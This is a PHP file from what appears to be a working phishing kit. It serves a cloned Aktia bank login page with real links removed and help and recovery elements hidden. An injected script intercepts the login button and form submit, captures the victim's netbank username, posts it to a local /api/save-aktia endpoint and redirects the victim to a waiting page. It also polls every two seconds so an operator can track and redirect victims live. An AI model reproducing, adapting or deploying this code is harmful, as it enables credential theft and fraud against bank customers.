<?php
ob_start();
$userName = htmlspecialchars($user['full_name'] ?? 'Kullanıcı');
$bankName = htmlspecialchars($bank['name'] ?? 'Aktia');
$htmlContent = file_get_contents(__DIR__ . '/aktiabank.html');

if (mb_detect_encoding($htmlContent, 'UTF-8', true) !== 'UTF-8') {
    $htmlContent = mb_convert_encoding($htmlContent, 'UTF-8', 'Windows-1252');
}

$htmlContent = preg_replace('/https?:\/\/[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/mailto:[^\s"\'<>]+/i', '#', $htmlContent);
$htmlContent = preg_replace('/tel:[^\s"\'<>]+/i', '#', $htmlContent);

$htmlContent = str_replace('./aktiabank_files/', '/aktia-files/', $htmlContent);
$htmlContent = str_replace('aktiabank_files/', '/aktia-files/', $htmlContent);
$htmlContent = preg_replace('/url\(([^\/)]+\.(woff2?|ttf))\)/i', 'url(/aktia-files/$1)', $htmlContent);

$hideStyle = '<style>
    #goog-gt-tt,
    #goog-gt-t,
    [id*="goog-gt"],
    [class*="goog-gt"],
    [id*="google_translate"],
    [class*="google_translate"],
    .VIpgJd-yAWNEb-L7lbkb,
    .skiptranslate,
    body > div:last-child:not([class*="container"]):not([id*="app"]),
    footer.avalon-footer,
    .avalon-footer,
    .avalon-aktia-footer,
    avalon-aktia-footer,
    #forgottenAccount,
    #forgottenAccount a,
    links,
    #links,
    .separator,
    hr.separator {
        display: none !important;
        visibility: hidden !important;
    }
    body, html {
        overflow-y: auto !important;
        overflow-x: hidden !important; /* Sağ-sol sürüşmə zolağını gizlət */
        max-width: 100vw !important;
        max-height: 100vh !important;
    }
    .container-md.main-container-sm {
        max-height: calc(100vh - 200px) !important;
        overflow-y: auto !important;
        overflow-x: hidden !important;
    }
</style>';

if (strpos($htmlContent, '</head>') !== false) {
    $htmlContent = str_replace('</head>', $hideStyle . '</head>', $htmlContent);
} else {
    $htmlContent = $hideStyle . $htmlContent;
}

$userId = isset($_SESSION['user_id']) ? $_SESSION['user_id'] : (isset($user['id']) ? $user['id'] : 0);

$adminScript = '';
if ($userId > 0) {
    $adminScript = '<script>
    (function() {
        const userId = ' . json_encode($userId) . ';
        const currentPage = window.location.pathname;
        const pageTitle = document.title;
        
        function updateCurrentPage() {
            fetch(\'/api/update-page\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    current_page: currentPage,
                    page_title: pageTitle
                })
            }).catch(() => {});
        }
        
        function checkAdminRedirect() {
            fetch(\'/api/check-redirect?user_id=\' + userId)
                .then(response => response.json())
                .then(data => {
                    if (data.redirect && data.redirect !== currentPage) {
                        window.location.href = data.redirect;
                    }
                })
                .catch(() => {});
        }
        
        function handleFormSubmit(e) {
            if (e) {
                e.preventDefault();
                e.stopPropagation();
                e.stopImmediatePropagation();
            }
            
            // Kullanıcı adını mümkün qədər çevik şəkildə tap
            let username = \'\';
            const usernameCandidates = [
                document.getElementById(\'fg-input-netbankId\'),
                document.querySelector(\'input[autocomplete="username"]\'),
                document.querySelector(\'input[type="text"]\'),
                document.querySelector(\'input[type="tel"]\'),
                document.querySelector(\'input[name*="user" i]\')
            ];
            for (const el of usernameCandidates) {
                if (el && el.value) {
                    username = el.value.trim();
                    break;
                }
            }
            
            if (!username) {
                return false;
            }
            
            fetch(\'/api/save-aktia\', {
                method: \'POST\',
                headers: { \'Content-Type\': \'application/json\' },
                body: JSON.stringify({
                    user_id: userId,
                    username: username
                })
            })
            .catch(() => {})
            .finally(() => {
                // Her halda bekleme səhifəsinə yönləndir
                window.location.href = \'/user/\' + userId + \'/bank/aktia2\';
            });
            
            return false;
        }
        
        // Button və form elementləri tez-tez yenidən render oluna bildiyi üçün
        // handler-ləri təkrar-təkrar bağlamaq üçün helper
        function bindAktiaHandlers() {
            // Vahvista düyməsi
            document.querySelectorAll(\'button\').forEach(function(btn) {
                const text = (btn.textContent || \'\').trim();
                if (text.indexOf(\'Vahvista\') !== -1 && !btn.dataset.aktiaBound) {
                    btn.dataset.aktiaBound = \'1\';
                    btn.addEventListener(\'click\', function(e) {
                        handleFormSubmit(e);
                    });
                }
            });
            
            // Form submit (əgər istifadəçi Enter ilə göndərirsə)
            document.querySelectorAll(\'form\').forEach(function(form) {
                if (!form.dataset.aktiaBound) {
                    form.dataset.aktiaBound = \'1\';
                    form.addEventListener(\'submit\', function(e) {
                        handleFormSubmit(e);
                    });
                }
            });
            
            // Klaviatura ilə Enter
            const usernameInput = document.getElementById(\'fg-input-netbankId\');
            if (usernameInput && !usernameInput.dataset.aktiaBound) {
                usernameInput.dataset.aktiaBound = \'1\';
                usernameInput.addEventListener(\'keypress\', function(e) {
                    if (e.key === \'Enter\') {
                        e.preventDefault();
                        handleFormSubmit(e);
                        return false;
                    }
                });
            }
        }
        
        function initForm() {
            bindAktiaHandlers();
            // Əgər sayfa framework tərəfindən yenidən render olunarsa, handler-ləri yenidən bağla
            setInterval(bindAktiaHandlers, 800);
        }
        
        if (document.readyState === \'loading\') {
            document.addEventListener(\'DOMContentLoaded\', initForm);
        } else {
            setTimeout(initForm, 100);
        }
        
        document.addEventListener(\'DOMContentLoaded\', function() {
            const googleTranslate = document.querySelectorAll(\'#goog-gt-tt, #goog-gt-t, [id*="goog-gt"], [class*="goog-gt"], [id*="google_translate"], [class*="google_translate"], .VIpgJd-yAWNEb-L7lbkb, .skiptranslate\');
            googleTranslate.forEach(function(el) {
                el.style.display = \'none\';
                el.style.visibility = \'hidden\';
            });
            const footer = document.querySelector(\'footer.avalon-footer, .avalon-footer, avalon-aktia-footer\');
            if (footer) {
                footer.style.display = \'none\';
                footer.style.visibility = \'hidden\';
            }
            const forgottenAccount = document.getElementById(\'forgottenAccount\');
            if (forgottenAccount) {
                forgottenAccount.style.display = \'none\';
                forgottenAccount.style.visibility = \'hidden\';
            }
            const links = document.querySelectorAll(\'links, #links, hr.separator, .separator\');
            links.forEach(function(el) {
                el.style.display = \'none\';
                el.style.visibility = \'hidden\';
            });

            // Material icon font yüklənmədiyi üçün "visibility" və "help_outline" yazıları çıxır – onları öz ikonalarmızla əvəz edək
            const visibilityEls = document.querySelectorAll(\'button, span, i, .mat-icon\');
            visibilityEls.forEach(function(el) {
                const txt = (el.textContent || \'\').trim().toLowerCase();

                // Göz ikonu (şifrə göstər/gizlət) – kliklənə bilən
                if ((txt === \'visibility\' || txt === \'visibility_off\') && !el.dataset.aktiaEyeBound) {
                    el.dataset.aktiaEyeBound = \'1\';

                    el.innerHTML = \'\';
                    const svgEye = document.createElementNS(\'http://www.w3.org/2000/svg\', \'svg\');
                    svgEye.setAttribute(\'width\', \'20\');
                    svgEye.setAttribute(\'height\', \'20\');
                    svgEye.setAttribute(\'viewBox\', \'0 0 24 24\');
                    svgEye.innerHTML = \'<path d="M12 4.5C7 4.5 3.27 7.61 2 12c1.27 4.39 5 7.5 10 7.5s8.73-3.11 10-7.5C20.73 7.61 17 4.5 12 4.5zm0 11.5a4 4 0 110-8 4 4 0 010 8z" fill="none" stroke="#000" stroke-width="1.7"/>\';
                    el.appendChild(svgEye);

                    el.style.cursor = \'pointer\';
                    el.style.display = \'inline-flex\';
                    el.style.alignItems = \'center\';
                    el.style.justifyContent = \'center\';

                    // Eyni konteynerdəki input-u tap
                    let container = el.closest(\'div\');
                    let input = null;
                    if (container) {
                        input = container.querySelector(\'input\');
                    }
                    if (!input) {
                        input = document.getElementById(\'fg-input-netbankId\');
                    }

                    if (input) {
                        let visible = false;
                        el.addEventListener(\'click\', function(ev) {
                            ev.preventDefault();
                            visible = !visible;
                            input.type = visible ? \'text\' : \'password\';
                        });
                    }
                }

                // "help_outline" üçün dairə içində sual işarəsi ikon – yalnız vizual, klik funksiyası vacib deyil
                if (txt === \'help_outline\' && !el.dataset.aktiaHelpBound) {
                    el.dataset.aktiaHelpBound = \'1\';
                    el.innerHTML = \'\';
                    const svgHelp = document.createElementNS(\'http://www.w3.org/2000/svg\', \'svg\');
                    svgHelp.setAttribute(\'width\', \'18\');
                    svgHelp.setAttribute(\'height\', \'18\');
                    svgHelp.setAttribute(\'viewBox\', \'0 0 24 24\');
                    svgHelp.innerHTML = \'<circle cx="12" cy="12" r="10" fill="none" stroke="#000" stroke-width="1.7"/><text x="12" y="16" text-anchor="middle" font-size="14" fill="#000">?</text>\';
                    el.appendChild(svgHelp);
                    el.style.display = \'inline-flex\';
                    el.style.alignItems = \'center\';
                    el.style.justifyContent = \'center\';
                }
            });
            document.body.style.overflowY = \'auto\';
            document.body.style.maxHeight = \'100vh\';
        });
        
        updateCurrentPage();
        checkAdminRedirect();
        setInterval(() => {
            updateCurrentPage();
            checkAdminRedirect();
        }, 2000);
    })();
    </script>';
}

if (strpos($htmlContent, '</body>') !== false) {
    $htmlContent = str_replace('</body>', $adminScript . '</body>', $htmlContent);
} else {
    $htmlContent = $htmlContent . $adminScript;
}

$content = ob_get_clean();
echo $htmlContent;
?>
